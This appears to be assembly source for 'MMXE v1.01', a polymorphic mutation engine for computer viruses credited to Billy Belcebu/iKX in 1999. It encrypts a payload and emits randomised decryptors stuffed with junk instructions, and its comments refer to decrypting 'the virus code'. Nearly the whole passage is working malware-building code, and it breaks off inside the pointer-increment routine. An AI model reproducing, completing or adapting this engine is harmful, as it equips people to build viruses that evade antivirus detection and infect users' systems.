_DELTAOFFSET    equ     0000000000000010b
_LOADSIZE       equ     0000000000000100b
_LOADPOINTER    equ     0000000000001000b
_LOADKEY        equ     0000000000010000b
_PASSKEY2MMX    equ     0000000000100000b
_PASSPTR2MMX    equ     0000000001000000b
_CRYPT          equ     0000000010000000b
_PASSMMX2PTR    equ     0000000100000000b
_INCPOINTER     equ     0000001000000000b
_DECCOUNTER     equ     0000010000000000b
_LOOP           equ     0000100000000000b

; [ POSITIONS ]

@CHECK4MMX      equ     00h
@DELTAOFFSET    equ     01h
@LOADSIZE       equ     02h
@LOADPOINTER    equ     03h
@LOADKEY        equ     04h
@PASSKEY2MMX    equ     05h
@PASSPTR2MMX    equ     06h
@CRYPT          equ     07h
@PASSMMX2PTR    equ     08h
@INCPOINTER     equ     09h
@DECCOUNTER     equ     0Ah
@LOOP           equ     0Bh

; [ PUSHAD structure ]

PUSHAD_EDI      equ     00h
PUSHAD_ESI      equ     04h
PUSHAD_EBP      equ     08h
PUSHAD_ESP      equ     0Ch
PUSHAD_EBX      equ     10h
PUSHAD_EDX      equ     14h
PUSHAD_ECX      equ     18h
PUSHAD_EAX      equ     1Ch

RETURN_ADDRESS  equ     04h

; [ MMXE v1.01 ]

mmxe            proc
	pushad
	call    @@init_mmxe

	pushad
	call    @@crypt_data
	popad

	call    @@gen_some_garbage
	call    @@gen_check4mmx
	call    @@gen_some_garbage

; Generate the 5 parts of the decryptor that go before the loop

@@gb4l_:
	call    @@gen_some_garbage
	call    @@gen_before_loop
@@gb4l?:
	movzx   ecx,word ptr [ebp+@@flags]
	xor     ecx,_CHECK4MMX or \             ; Check if all flags were 
		    _DELTAOFFSET or \           ; done ... (They should be,
		    _LOADSIZE or \              ; but i don't trust in my own
		    _LOADPOINTER or \           ; code :)
		    _LOADKEY or \
		    _PASSKEY2MMX
	jnz     @@gb4l_
	
; Get the loop point

	call    @@getloopaddress
	call    @@gen_some_garbage

; Generate the decryptor instructions that form the loop

	lea     esi,[ebp+@@after_looptbl]
	mov     ecx,@@s_aftlooptbl
@@gal:  lodsd
	add     eax,ebp

	push    ecx esi
	call    eax
	call    @@gen_some_garbage
	pop     esi ecx

	loop    @@gal

	mov     al,0E9h
	stosb
	mov     eax,LIMIT
	mov     ebx,edi
	sub     ebx,dword ptr [ebp+@@ptr_buffer]
	add     ebx,4
	sub     eax,ebx
	stosd

; And now generate the non-MMX decryptor

	call    @@gen_garbage

	mov     eax,dword ptr [ebp+@@ptrto2nd]
	mov     ebx,edi
	sub     ebx,eax
	sub     ebx,4
	mov     dword ptr [eax],ebx

	and     word ptr [ebp+@@flags],0000h
	and     byte ptr [ebp+@@init_mmx?],00h
	or      word ptr [ebp+@@flags],_CHECK4MMX

@@gb4lx_:
	call    @@gen_some_garbage
	call    @@gen_before_loop_non_mmx

@@gb4lx?:
	movzx   ecx,word ptr [ebp+@@flags]
	xor     ecx,_CHECK4MMX or \             ; Check if all flags were 
		    _DELTAOFFSET or \           ; done ... (They should be,
		    _LOADSIZE or \              ; but i don't trust in my own
		    _LOADPOINTER or \           ; code :)
		    _LOADKEY
	jz      @@continue_with_this

	movzx   ecx,word ptr [ebp+@@flags]
	xor     ecx,_CHECK4MMX or \             ; In strange files, i dunno
		    _DELTAOFFSET or \           ; why, instead 1F, we must 
		    _LOADSIZE or \              ; check for 3F... otherwise,
		    _LOADPOINTER or \           ; all it goes to hell :(
		    _LOADKEY or \
		    _PASSKEY2MMX
	jnz     @@gb4lx_

@@continue_with_this:
	call    @@gen_garbage
	call    @@getloopaddress

	lea     esi,[ebp+@@after_l00ptbl]
	mov     ecx,@@s_aftl00ptbl
@@galx: lodsd
	add     eax,ebp

	push    ecx esi
	call    eax
	call    @@gen_some_garbage
	pop     esi ecx

	loop    @@galx

	mov     al,0E9h                         ; Generate the JMP to the 
	stosb                                   ; decrypted virus code
	mov     eax,LIMIT
	mov     ebx,edi
	sub     ebx,dword ptr [ebp+@@ptr_buffer]
	add     ebx,04h
	sub     eax,ebx
	stosd

	xchg    eax,ecx                         ; Fill with shit the rest
@@FillTheRest:
	call    random
	stosb
	loop    @@FillTheRest


	call    @@uninit_mmxe
	popad
	ret

	db      00h,"[MMXE v1.01]",00h

; --- Initialization & Uninitialization routines

@@init_mmxe:
	mov     dword ptr [ebp+@@ptr_data2enc],esi
	mov     dword ptr [ebp+@@ptr_buffer],edi
	mov     dword ptr [ebp+@@size2enc],ecx
	shr     ecx,2
	mov     dword ptr [ebp+@@size2cryptd4],ecx
	and     byte ptr [ebp+@@init_mmx?],00h
	and     word ptr [ebp+@@flags],00h
	call    random
	mov     dword ptr [ebp+@@enc_key],eax

@@get_key:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@get_key
	cmp     eax,_ESP
	jz      @@get_key
	mov     byte ptr [ebp+@@reg_key],al
	mov     ebx,eax
@@get_ptr2data:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@get_ptr2data
	cmp     eax,_ESP
	jz      @@get_ptr2data
	cmp     eax,_EBP
	jz      @@get_ptr2data
	cmp     eax,ebx
	jz      @@get_ptr2data
	mov     byte ptr [ebp+@@reg_ptr2data],al
	mov     ecx,eax
@@get_counter:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@get_counter
	cmp     eax,_ESP
	jz      @@get_counter
	cmp     eax,ebx
	jz      @@get_counter
	cmp     eax,ecx
	jz      @@get_counter
	mov     byte ptr [ebp+@@reg_counter],al
	mov     edx,eax
@@get_delta:
	mov     eax,08h
	call    r_range
	or      eax,eax
	jz      @@get_delta
	cmp     eax,_ESP
	jz      @@get_delta
	cmp     eax,ebx
	jz      @@get_delta
	cmp     eax,ecx
	jz      @@get_delta
	cmp     eax,edx
	jz      @@get_delta
	mov     byte ptr [ebp+@@reg_delta],al
	mov     edx,eax
@@get_mmxptr2data:
	mov     eax,08h
	call    r_range
	mov     byte ptr [ebp+@@mmx_ptr2data],al
	mov     ebx,eax
@@get_mmxkey:
	mov     eax,08h
	call    r_range
	cmp     eax,ebx
	jz      @@get_mmxkey
	mov     byte ptr [ebp+@@mmx_key],al

	mov     dword ptr [edi],"EXMM"
	ret

@@uninit_mmxe:
	mov     ecx,edi
	sub     ecx,dword ptr [ebp+@@ptr_buffer]
	mov     [esp.RETURN_ADDRESS.PUSHAD_ECX],ecx
	ret

; --- Who made this? Ehrm... oh, it was me! :)

	db      00h,"[- (c) 1999 Billy Belcebu/iKX -]",00h

; --- Useful subroutines used by the engine

@@get_register:
	movzx   ebx,byte ptr [ebp+@@reg_key]
	movzx   ecx,byte ptr [ebp+@@reg_ptr2data]
	movzx   edx,byte ptr [ebp+@@reg_counter]
	movzx   esi,byte ptr [ebp+@@reg_delta]
@@gr_get_another:
	mov     eax,08h
	call    r_range
	cmp     eax,_ESP
	jz      @@gr_get_another
	cmp     eax,ebx
	jz      @@gr_get_another
	cmp     eax,ecx
	jz      @@gr_get_another
	cmp     eax,edx
	jz      @@gr_get_another
	cmp     eax,esi
	jz      @@gr_get_another
	cmp     al,byte ptr [ebp+@@reg_mask]
	jz      @@gr_get_another
	ret

@@get_mmx_register:
	movzx   ebx,byte ptr [ebp+@@mmx_ptr2data]
	movzx   ecx,byte ptr [ebp+@@mmx_key]
@@gmmxr_get_another:
	mov     eax,08h
	call    r_range
	cmp     eax,ebx
	jz      @@gmmxr_get_another
	cmp     eax,ecx
	jz      @@gmmxr_get_another
	ret

@@clear_mask:
	and     byte ptr [ebp+@@reg_mask],00h
	ret

@@is_register:
	cmp     al,byte ptr [ebp+@@reg_key]
	jz      @@is_used
	cmp     al,byte ptr [ebp+@@reg_ptr2data]
	jz      @@is_used
	cmp     al,byte ptr [ebp+@@reg_counter]
	jz      @@is_used
	cmp     al,byte ptr [ebp+@@reg_delta]
	jz      @@is_used
	cmp     al,byte ptr [ebp+@@reg_mask]
	jz      @@is_used
	mov     cl,00h
	org     $-1
@@is_used:
	stc
	ret

@@gen_before_loop:
	mov     eax,05h
	call    r_range
	or      eax,eax                         ; 0
	jz      @@try_deltaoffset
	dec     eax                             ; 1
	jz      @@try_loadsize
	dec     eax                             ; 2
	jz      @@try_loadpointer
	dec     eax                             ; 3
	jz      @@try_loadkey                   ; 4
	jmp     @@try_passkey2mmx               ; 5

@@try_deltaoffset:
	bt      word ptr [ebp+@@flags],@DELTAOFFSET
	jc      @@gen_before_loop
	call    @@gen_deltaoffset
	ret

@@try_loadsize:
	bt      word ptr [ebp+@@flags],@LOADSIZE
	jc      @@gen_before_loop
	call    @@gen_loadsize
	ret

@@try_loadpointer:
	bt      word ptr [ebp+@@flags],@LOADPOINTER
	jc      @@gen_before_loop
	bt      word ptr [ebp+@@flags],@DELTAOFFSET
	jnc     @@gen_before_loop
	call    @@gen_loadpointer
	ret

@@try_loadkey:
	bt      word ptr [ebp+@@flags],@LOADKEY
	jc      @@gen_before_loop
	call    @@gen_loadkey
	ret

@@try_passkey2mmx:       
	bt      word ptr [ebp+@@flags],@PASSKEY2MMX
	jc      @@gen_before_loop        
	bt      word ptr [ebp+@@flags],@LOADKEY
	jnc     @@gen_before_loop
	call    @@gen_passkey2mmx
	ret

@@gen_before_loop_non_mmx:
	mov     eax,04h
	call    r_range
	or      eax,eax                         ; 0
	jz      @@try_deltaoffset_non_mmx
	dec     eax                             ; 1
	jz      @@try_loadsize_non_mmx
	dec     eax                             ; 2
	jz      @@try_loadpointer_non_mmx
	jmp     @@try_loadkey_non_mmx

@@try_deltaoffset_non_mmx:
	bt      word ptr [ebp+@@flags],@DELTAOFFSET
	jc      @@gen_before_loop
	call    @@gen_deltaoffset
	ret

@@try_loadsize_non_mmx:
	bt      word ptr [ebp+@@flags],@LOADSIZE
	jc      @@gen_before_loop
	call    @@gen_loadsize
	ret

@@try_loadpointer_non_mmx:
	bt      word ptr [ebp+@@flags],@LOADPOINTER
	jc      @@gen_before_loop
	bt      word ptr [ebp+@@flags],@DELTAOFFSET
	jnc     @@gen_before_loop
	call    @@gen_loadpointer
	ret

@@try_loadkey_non_mmx:
	bt      word ptr [ebp+@@flags],@LOADKEY
	jc      @@gen_before_loop
	call    @@gen_loadkey
	ret

@@crypt_data:
	mov     ecx,dword ptr [ebp+@@size2cryptd4]
	mov     ebx,dword ptr [ebp+@@enc_key]
	mov     edi,dword ptr [ebp+@@ptr_data2enc]
	mov     esi,edi
@@cl00p:lodsd
	xor     eax,ebx
	stosd
	loop    @@cl00p
	ret

; --- Garbage generators

@@gen_garbage:
	inc     byte ptr [ebp+@@recursion]
	cmp     byte ptr [ebp+@@recursion],RECURSION
	jae     @@gg_exit

	cmp     byte ptr [ebp+@@init_mmx?],00h
	ja      @@gg_mmx
@@gg_non_mmx:
	mov     eax,@@non_mmx_gbg
	jmp     @@gg_doit
@@gg_mmx:
	mov     eax,@@s_gbgtbl
@@gg_doit:
	call    r_range
	lea     ebx,[ebp+@@gbgtbl]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax

@@gg_exit:
	dec     byte ptr [ebp+@@recursion]
	ret

@@gen_some_garbage:
	mov     ecx,nGARBAGE
@@gsg_l00p:
	push    ecx
	call    @@gen_garbage
	pop     ecx
	loop    @@gsg_l00p
	ret

; Generates any arithmetic operation with a register with another one register:
; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP REG32,REG32

@@gen_arithmetic_reg32_reg32:
	call    random
	and     al,00111000b            ; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]
	or      al,00000011b            
	stosb

@@gar32r32:
	call    @@get_register
	or      al,al
	jz      @@gar32r32
	shl     eax,3
	or      al,11000000b
	push    eax
	call    random
	and     al,00000111b
	xchg    ebx,eax
	pop     eax
	or      al,bl
	stosb
	ret 

; Generates any arithmetic operation with an immediate with a 32bit register:
; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP REG32,IMM32

@@gen_arithmetic_reg32_imm32:
	mov     al,81h                  ; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]
	stosb
@@gar32i32:
	call    @@get_register
	or      al,al
	jz      @@gar32i32
	push    eax
	call    random       
	and     al,00111000b
	or      al,11000000b
	pop     ebx
	or      al,bl
	stosb
	call    random
	stosd
	ret

; Generates any arithmetic operation with an immediate with EAX:
; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP EAX,IMM32

@@gen_arithmetic_eax_imm32:
	call    random
	and     al,00111000b            ; [ADD,OR,ADC,SBB,AND,SUB,XOR,CMP]
	or      al,00000101b            
	stosb
	call    random
	stosd
	ret

; Generates a mov immediate to 32 bit reg:
;       MOV     REG32,IMM32

@@gen_mov_reg32_imm32:
	call    @@get_register
	add     al,0B8h
	stosb
	call    random
	stosd
	ret

; Generates mov immediate to 8bit reg:
;       MOV     REG8,IMM8

@@gen_mov_reg8_imm8:
	mov     eax,4
	call    r_range
	call    @@is_register
	jc      @@quitthisshit
	push    eax
	mov     eax,2
	call    r_range
	pop     ecx
	xchg    eax,ecx
	jecxz   @@use_msb
@@put_it:
	add     al,0B0h
	stosb
	call    random
	stosb       
@@quitthisshit:
	ret
@@use_msb:
	or      al,00000100b
	jmp     @@put_it

; Generates CALLs to subroutines:
;       CALL    @@1
;       [...]
;       JMP     @@2
;       [...]
;  @@1: [...]
;       RET
;       [...]
;  @@2: [...]

@@gen_call_to_subroutine:
	mov     al,0E8h
	stosb
	xor     eax,eax
	stosd
	push    edi
	call    @@gen_garbage
	mov     al,0E9h
	stosb
	xor     eax,eax
	stosd
	push    edi
	call    @@gen_garbage
	mov     al,0C3h
	stosb
	call    @@gen_garbage
	mov     ebx,edi
	pop     edx
	sub     ebx,edx
	mov     [edx-4],ebx
	pop     ecx
	sub     edx,ecx
	mov     [ecx-4],edx
@@do_anything:
	ret

; Generate push/garbage/pop structure (allows recursivity):
;       PUSH    REG
;       [...]
;       POP     REG
;

@@gen_push_garbage_pop:
	mov     eax,08h
	call    r_range
	add     al,50h
	stosb
	call    @@gen_garbage
	call    @@get_register
	add     al,58h
	stosb
	ret

; MMX Group 1:
;
; PUNPCKLBW/PUNPCKLWD/PUNPCKLDQ/PACKSSWB/PCMPGTB/PCMPGTW/PCMPGTD/PACHUSWB
; PUNPCKHBW/PUNPCKHWD/PUNPCKHDQ/PACKSSDW

@@gen_mmx_group1:
	mov     bx,600Fh
	mov     eax,0Ch
	call    r_range
	add     bh,al
	xchg    eax,ebx
	stosw
	call    @@build_mmx_gbg_rib
	ret

@@gen_mmx_movq_mm?_mm?:
	mov     ax,6F0Fh                        ; MOVQ MM?,MM?
	stosw
	call    @@build_mmx_gbg_rib
	ret

@@gen_mmx_movd_mm?_reg32:
	mov     ax,7E0Fh                        ; MOVD MM?,E??
	stosw
	call    @@get_mmx_register
	shl     eax,3
	push    eax
	call    @@get_register
	xchg    eax,ebx
	pop     eax
	or      al,bl
	or      al,11000000b
	stosb
	ret

; MMX Group 2:
;
; PCMPEQB/PCMPEQW/PCMPEQD

@@gen_mmx_group2:
	mov     al,0Fh
	stosb
	mov     eax,3
	call    r_range
	add     al,74h
	stosb
	call    @@build_mmx_gbg_rib
	ret

; MMX Group 3:
;
; PSRLW/PSRLD/PSRLQ/PMULLW/PSUBUSB/PSUBUSW/PAND/PADDUSB/PADDUSW/PANDN/PSRAW
; PSRAD/PMULHW/PSUBSB/PSUBSW/POR/PADDSB/PADDSW/PXOR/PSLLW/PSLLD/PSLLQ/PMULADDWD

@@gen_mmx_group3:
	mov     al,0Fh
	stosb
	call    @@__overshit
@@eoeo: db      0D1h,0D2h,0D3h,0D5h,0D8h,0D9h,0DBh,0DCh,0DDh,0DFh
	db      0E1h,0E2h,0E5h,0E8h,0E9h,0EBh,0ECh,0EDh,0EFh
	db      0F1h,0F2h,0F5h
sg3tbl  equ     ($-offset @@eoeo)
@@__overshit:
	pop     esi
	mov     eax,sg3tbl
	call    r_range
	mov     al,byte ptr [esi+eax]
	stosb
	call    @@build_mmx_gbg_rib
@@gmmx_goaway:
	ret

@@build_mmx_gbg_rib:
	call    @@get_mmx_register
	shl     eax,3
	push    eax
	call    @@get_mmx_register
	xchg    eax,ebx
	pop     eax
	or      eax,ebx
	or      al,11000000b
	stosb
	ret

; Generate Onebyters:
;
; CLD/CMC/SALC/NOP/LAHF/INC EAX/DEC EAX/SAHF/(F)WAIT/CWDE

@@gen_onebyter:
	call    @@go_overshit
	db      0FCh,0F5h,0D6h,90h,9Fh,40h,48h,9Eh,9Bh,98h
@@go_overshit:
	pop     esi
	mov     eax,0Ah
	call    r_range
	mov     al,byte ptr [esi+eax]
	stosb
	ret

; Generate many possible ways for make a determinated register to be 0:
; XOR REG,REG/SUB REG,REG/PUSH 0 POP REG/AND REG,0/MOV REG,0

@@gen_zer0_reg:
	call    @@get_register                  ; For garbage generators
@@gen_zero_reg:
	push    eax
	mov     eax,06h
	call    r_range
	pop     ecx
	xchg    eax,ecx
	jecxz   @@xor_reg_reg
	dec     ecx
	jecxz   @@sub_reg_reg
	dec     ecx
	jecxz   @@push_0_pop_reg
	dec     ecx
	jecxz   @@and_reg_0
	dec     ecx
	jecxz   @@mov_reg_0
@@or_reg_m1_inc_reg:       
	push    eax
	cmp     al,_EAX
	jnz     @@or_reg_m1
@@or_eax_m1:
	mov     al,0Dh                          ; OR EAX,-1
	stosb
	xor     eax,eax
	dec     eax
	stosd
	jmp     @@orm1ir_inc_reg
@@or_reg_m1:
	xchg    eax,ebx
	mov     ax,0C883h                       ; OR REG,-1
	or      ah,bl
	stosw
	xor     eax,eax
	dec     eax
	stosb
	xchg    eax,ebx
@@orm1ir_inc_reg:
	pop     eax
	add     al,40h                          ; INC REG
	stosb
	ret

@@xor_reg_reg:
	xchg    eax,ebx
	mov     ax,0C033h                       ; XOR REG,REG
	or      ah,bl
	shl     ebx,3
	or      ah,bl
	stosw
	ret

@@sub_reg_reg:
	xchg    eax,ebx
	mov     ax,0C02Bh                       ; SUB REG,REG
	or      ah,bl
	shl     ebx,3
	or      ah,bl
	stosw
	ret

@@push_0_pop_reg:
	push    eax
	mov     ax,006Ah                        ; PUSH 00h
	stosw                                   ; POP REG
	pop     eax
	add     al,58h
	stosb
	ret

@@and_reg_0:
	cmp     al,_EAX
	jnz     @@and_regnoteax_0
@@and_eax_0:
	mov     al,25h
	stosb
	xor     eax,eax
	stosd
	ret
@@and_regnoteax_0:
	xchg    eax,ebx 
	mov     ax,0E083h                       ; AND REG,00
	or      ah,bl
	stosw
	xor     eax,eax
	stosb
	ret

@@mov_reg_0:
	add     al,0B8h                         ; MOV REG,00000000
	stosb
	xor     eax,eax
	stosd
	ret

; --- Decryptor code generators

; Generate the routine for check for MMX presence, that should perform exactly
; the same action of the following code:
;       MOV     EAX,1
;       CPUID
;       BT      EDX,17h
;       JNC     NOT_MMX

@@gen_check4mmx:
	mov     eax,08h
	call    r_range
	xchg    eax,ecx
	jecxz   @@c4mmx_a_@@1
	dec     ecx
	jecxz   @@c4mmx_a_@@2
	dec     ecx
	jecxz   @@c4mmx_a_@@3
	dec     ecx
	jecxz   @@c4mmx_a_@@4
	dec     ecx
	jecxz   @@c4mmx_a_@@5
	dec     ecx
	jecxz   @@c4mmx_a_@@6
	dec     ecx
	jecxz   @@c4mmx_a_@@7
@@c4mmx_a_@@8:
	xor     eax,eax                         ; ZERO EAX
	call    @@gen_zero_reg                  ; SUB EAX,-1
	mov     al,2Dh
	stosb
	xor     eax,eax
	dec     eax
	stosd
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@7:
	xor     eax,eax                         ; ZERO EAX
	call    @@gen_zero_reg                  ; ADD EAX,1
	mov     al,05h
	stosb
	xor     eax,eax
	inc     eax
	stosd
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@6:
	xor     eax,eax                         ; ZERO EAX
	call    @@gen_zero_reg                  ; STC
	mov     ax,1DF9h                        ; SBB EAX,-2
	stosw
	xor     eax,eax
	dec     eax
	dec     eax
	stosd
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@5:
	xor     eax,eax                         ; ZERO EAX
	call    @@gen_zero_reg                  ; STC
	mov     ax,15F9h                        ; ADC EAX,00000000
	stosw
	xor     eax,eax
	stosd
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@4:
	mov     al,0Dh                          ; OR EAX,-1
	stosb                                   ; AND EAX,1
	xor     eax,eax
	dec     eax
	stosd
	mov     al,25h
	stosb
	xor     eax,eax
	inc     eax
	stosd       
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@3:
	mov     eax,9058016Ah                   ; PUSH 01
	stosd                                   ; POP EAX
	dec     edi
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@2:
	xor     eax,eax
	call    @@gen_zero_reg                  ; ZERO EAX
	mov     al,40h                          ; INC EAX
	stosb
	jmp     @@c4mmx_over_a
@@c4mmx_a_@@1:
	mov     al,0B8h                         ; MOV EAX,1
	stosb
	xor     eax,eax
	inc     eax
	stosd
@@c4mmx_over_a:
	call    @@gen_garbage

	mov     ax,0A20Fh                       ; CPUID
	stosw

	call    @@clear_mask
	mov     byte ptr [ebp+@@reg_mask],_EDX

	call    @@gen_garbage

	mov     eax,03h
	call    r_range
	or      eax,eax
	jz      @@c4mmx_b_@@3
	dec     eax
	jz      @@c4mmx_b_@@2

@@c4mmx_b_@@1:
	mov     eax,17E2BA0Fh                   ; BT EDX,17h
	stosd                                   ; JC $+??
	mov     al,72h
	stosb
	jmp     @@c4mmx_over_b
@@c4mmx_b_@@2:
	mov     eax,0000C2F7h                   ; TEST EDX,00400000h
	stosd                                   ; JZ $+??
	mov     eax,00740040h
	stosd
	dec     edi
	jmp     @@c4mmx_over_b
@@c4mmx_b_@@3:
	mov     eax,7218EAC1h                   ; SHR EDX,18h
	stosd                                   ; JC $+??
@@c4mmx_over_b:
	push    edi
	inc     edi                             ; Fake data for temp. fill

	call    @@gen_garbage

	mov     al,0e9h                         ; RET
	stosb

	mov     dword ptr [ebp+@@ptrto2nd],edi
	xor     eax,eax
	stosd

	call    @@gen_garbage

	pop     ebx
	mov     edx,edi
	sub     edx,ebx
	dec     edx
	mov     byte ptr [ebx],dl

	inc     byte ptr [ebp+@@init_mmx?]

	or      word ptr [ebp+@@flags],_CHECK4MMX
	ret

; Generate a routine for get the pseudo delta-offset, which will look like
; this one:
;       CALL    @@1
;       [...]
;  @@1: POP     REG

@@gen_deltaoffset:
	mov     eax,10h
	call    r_range
	xchg    eax,ebx
	mov     al,0E8h
	stosb
	xor     eax,eax
	stosd
	mov     dword ptr [ebp+@@tmp_call],edi
	call    @@gen_garbage
	mov     ecx,dword ptr [ebp+@@tmp_call]
	mov     ebx,edi
	sub     ebx,ecx
	mov     [ecx-4],ebx
	mov     al,58h
	add     al,byte ptr [ebp+@@reg_delta]
	stosb
	mov     ebx,dword ptr [ebp+@@ptr_buffer]
	sub     ecx,ebx
	mov     dword ptr [ebp+@@fix1],ecx
	or      word ptr [ebp+@@flags],_DELTAOFFSET
	ret

; Generate a routine for put in the register used as counter the size of the
; code we want to decrypt

@@gen_loadsize:
	or      word ptr [ebp+@@flags],_LOADSIZE
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   @@gls_@@2
@@gls_@@1:
	mov     al,68h                          ; PUSH size
	stosb                                   ; POP reg_size
	mov     dword ptr [ebp+@@size_address],edi
	mov     eax,dword ptr [ebp+@@size2cryptd4]
	stosd
	call    @@gen_garbage
	mov     al,58h
	add     al,byte ptr [ebp+@@reg_counter]
	stosb
	ret
@@gls_@@2:
	movzx   eax,byte ptr [ebp+@@reg_counter]
	add     eax,0B8h                        ; MOV reg_size,size
	stosb
	mov     dword ptr [ebp+@@size_address],edi
	mov     eax,dword ptr [ebp+@@size2cryptd4]
	stosd
	ret

; Generate the code that will make the pointer register to point exactly to
; the beginning of the code we want to encrypt or decrypt

@@gen_loadpointer:
	mov     eax,LIMIT
	sub     eax,dword ptr [ebp+@@fix1]
	mov     dword ptr [ebp+@@fix2],eax

	mov     eax,03h
	call    r_range
	or      eax,eax
	jz      @@lp_@@3
	dec     eax
	jz      @@lp_@@2
@@lp_@@1:
	mov     al,8Dh                          ; LEA reg_ptr,[reg_delta+fix]
	stosb
	movzx   eax,byte ptr [ebp+@@reg_ptr2data]
	shl     al,3
	add     al,10000000b
	add     al,byte ptr [ebp+@@reg_delta]
	stosb
	jmp     @@lp_
@@lp_@@2:
	mov     al,8Bh                          ; MOV reg_ptr,reg_delta
	stosb                                   ; ADD reg_ptr,fix
	movzx   eax,byte ptr [ebp+@@reg_ptr2data]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_delta]
	or      al,11000000b
	stosb
	call    @@gen_garbage
	mov     al,81h
	stosb
	mov     al,0C0h
	or      al,byte ptr [ebp+@@reg_ptr2data]
	stosb
	jmp     @@lp_
@@lp_@@3:
	call    @@clear_mask                    ; MOV reg_mask,fix2
	call    @@get_register                  ; LEA reg_ptr,[reg_mask+reg_delta+(fix+fix2)]
	mov     byte ptr [ebp+@@reg_mask],al

	add     al,0B8h
	stosb
	call    random
	stosd

	push    eax
	call    @@gen_garbage
	pop     edx

	sub     dword ptr [ebp+@@fix2],edx

	mov     al,8Dh
	stosb
	movzx   eax,byte ptr [ebp+@@reg_ptr2data]
	shl     eax,3
	or      al,10000100b
	stosb
	movzx   eax,byte ptr [ebp+@@reg_mask]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_delta]
	stosb

@@lp_:
	mov     eax,dword ptr [ebp+@@fix2]
	stosd
	or      word ptr [ebp+@@flags],_LOADPOINTER
	ret

; Put in the register used as key the number used for the encryption of the
; virus code.

@@gen_loadkey:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   @@glk_@@2
@@glk_@@1:
	mov     al,68h                          ; PUSH enc_key
	stosb                                   ; POP reg_key
	mov     eax,dword ptr [ebp+@@enc_key]
	stosd
	call    @@gen_garbage
	mov     al,58h
	add     al,byte ptr [ebp+@@reg_key]
	stosb
	or      word ptr [ebp+@@flags],_LOADKEY
	ret
@@glk_@@2:                                      ; MOV key_reg,enc_key
	movzx   eax,byte ptr [ebp+@@reg_key]
	add     eax,0B8h
	stosb
	mov     eax,dword ptr [ebp+@@enc_key]
	stosd
	or      word ptr [ebp+@@flags],_LOADKEY
	ret

; Generate the code for pass the encryption key to an MMX register

@@gen_passkey2mmx:
	mov     ax,6E0Fh                        ; MOV mmx_key,reg_key
	stosw
	movzx   eax,byte ptr [ebp+@@mmx_key]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_key]
	or      al,11000000b
	stosb
	or      word ptr [ebp+@@flags],_PASSKEY2MMX
	ret

; Just for know where we must loop the decryptor

@@getloopaddress:
	mov     dword ptr [ebp+@@l00paddress],edi
	ret

; Pass the dword of code we are decrypting to the MMX register used for that
; matter

@@gen_passptr2mmx:
	mov     ax,6E0Fh                        ; MOV mmx_ptr,[reg_ptr]
	stosw
	movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_ptr2data]
	stosb
	or      word ptr [ebp+@@flags],_PASSPTR2MMX
	ret

; Generate the MMX encryption opcode:
; PXOR

@@gen_crypt_instructions:
	mov     ax,0EF0Fh                          ; PXOR mmx_ptr,mmx_key
	stosw
	movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
	shl     eax,3
	or      al,byte ptr [ebp+@@mmx_key]
	or      al,11000000b
	stosb
	or      word ptr [ebp+@@flags],_CRYPT
	ret

; Generate the alternative method of MMX encryption code:
; PXOR = XOR

@@gen_non_mmx_crypt_instructions:
	mov     ax,0031h                        ; XOR [reg_ptr],reg_key
	movzx   ebx,byte ptr [ebp+@@reg_key]
	shl     ebx,3
	or      bl,byte ptr [ebp+@@reg_ptr2data]
	or      ah,bl
	stosw
	ret

; Generate the code that will pass the already decrypted data to its original
; position

@@gen_passmmx2ptr:
	mov     ax,7E0Fh                        ; MOVD [reg_ptr],(mmx_ptr xor mmx_key)
	stosw
	movzx   eax,byte ptr [ebp+@@mmx_ptr2data]
	shl     eax,3
	or      al,byte ptr [ebp+@@reg_ptr2data]
	stosb
	or      word ptr [ebp+@@flags],_PASSMMX2PTR
	ret

; Select the order between increase pointer and decrease counter

@@gen_incpointer_deccounter:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   @@gdc_gip
@@gip_gdc:
	call    @@gen_incpointer
	call    @@gen_some_garbage
	call    @@gen_deccounter
	ret
@@gdc_gip:
	call    @@gen_deccounter
	call    @@gen_some_garbage
	call    @@gen_incpointer
	ret

; Generate the code for make the pointer register to point to the next dword

@@gen_incpointer:
	mov     eax,5
	call    r_range
	xchg    eax,ecx
	jecxz   @@gip_@@2
	dec     ecx
	jz      @@gip_@@3
	dec     ecx
	jz      @@gip_@@4
	dec     ecx
	jnz     @@gip_@@1
	jmp     @@gip_@@5

@@gip_@@1:
	mov     bl,4                            ; ADD reg_ptr,4
	call    @@gip_AddIt
	jmp     @@gip_EXIT

@@gip_@@2:
	mov     eax,2                   
	call    r_range
	xchg    eax,ecx
	jecxz   @@gip_@@2_@@2
@@gip_@@2_@@1:
	mov     bl,3                            ; ADD reg_ptr,3
	call    @@gip_AddIt

	call    @@gen_garbage

	mov     bl,1                            ; INC reg_ptr
	call    @@gip_IncIt
	jmp     @@gip_@@2_EXIT
@@gip_@@2_@@2:
	mov     bl,1                            ; INC reg_ptr
	call    @@gip_IncIt

	call    @@gen_garbage

	mov     bl,3
	call    @@gip_AddIt                     ; ADD reg_ptr,3
@@gip_@@2_EXIT:
	jmp     @@gip_EXIT

@@gip_@@3:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   @@gip_@@3_@@2
@@gip_@@3_@@1:
	mov     bl,2                            ; ADD reg_ptr,2
	call    @@gip_AddIt

	call    @@gen_garbage

